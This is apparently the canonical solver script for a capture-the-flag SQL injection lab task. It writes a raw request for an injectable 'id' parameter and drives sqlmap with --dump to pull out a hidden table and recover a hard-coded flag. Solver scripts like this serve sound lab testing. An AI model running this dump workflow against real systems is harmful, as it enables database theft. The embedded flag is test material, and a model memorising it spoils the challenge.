#!/usr/bin/env bash
# solvers/p2_1.sh — Task 2.1 "Automated Floor Skip" canonical exploit.
#
# Unlike every Phase 1 floor (solved by hand-crafting one payload), this
# floor's whole point is the sqlmap workflow itself: the numeric `id` param
# on /p2/floors is spliced unescaped into the query with no quoting at all,
# so it's injectable via boolean-blind, error-based, UNION, and time-based
# techniques all at once — sqlmap's default detection finds it with zero
# special tuning. This script saves a raw HTTP request to a file and drives
# sqlmap exactly the way an operator would: point it at the request, let it
# confirm the injection, enumerate down to the hidden `vault_floors` table,
# and dump it — then grep sqlmap's own dump output for the flag.
set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{sqlmap_walks_the_floors}"

# Strip scheme; keep host[:port] verbatim for the request file's Host header
# (sqlmap reads target host *and* port straight from -r's Host: line).
HOST="${BASE#http://}"
HOST="${HOST#https://}"

WORKDIR=$(mktemp -d)
REQ="${WORKDIR}/req.txt"
OUTDIR="${WORKDIR}/sqlmap-out"
LOG="${WORKDIR}/sqlmap.log"
trap 'rm -rf "$WORKDIR"' EXIT

cat > "$REQ" <<EOF
GET /p2/floors?id=1 HTTP/1.1
Host: ${HOST}
User-Agent: seiyaku-arc-solver
Accept: */*
Connection: close

EOF

echo "[p2_1] saved raw request to ${REQ}:"
sed 's/^/  | /' "$REQ"

echo "[p2_1] running: sqlmap -r req.txt -p id --batch --dump -T vault_floors"
# --ignore-stdin: this script's own stdin isn't an interactive terminal, and
# without this flag sqlmap treats a non-tty stdin as a *second* target-list
# source (piped URLs) and races it against -r's request file — under a
# closed/non-tty stdin that source hits EOF instantly and sqlmap exits
# having never actually scanned anything. -r plus --batch alone is not
# enough in that environment; --ignore-stdin makes -r the sole target
# source, which is what we want here.
sqlmap -r "$REQ" -p id --batch --ignore-stdin --dump -T vault_floors \
    --output-dir="$OUTDIR" 2>&1 | tee "$LOG"

if grep -qF "$FLAG" "$LOG" || grep -rqF "$FLAG" "$OUTDIR" 2>/dev/null; then
    echo "[p2_1] ok: flag recovered from sqlmap's dump: ${FLAG}"
    echo "[p2_1] PASS"
    exit 0
else
    echo "[p2_1] FAIL: flag not found in sqlmap output or dump files"
    echo "[p2_1] FAIL"
    exit 1
fi
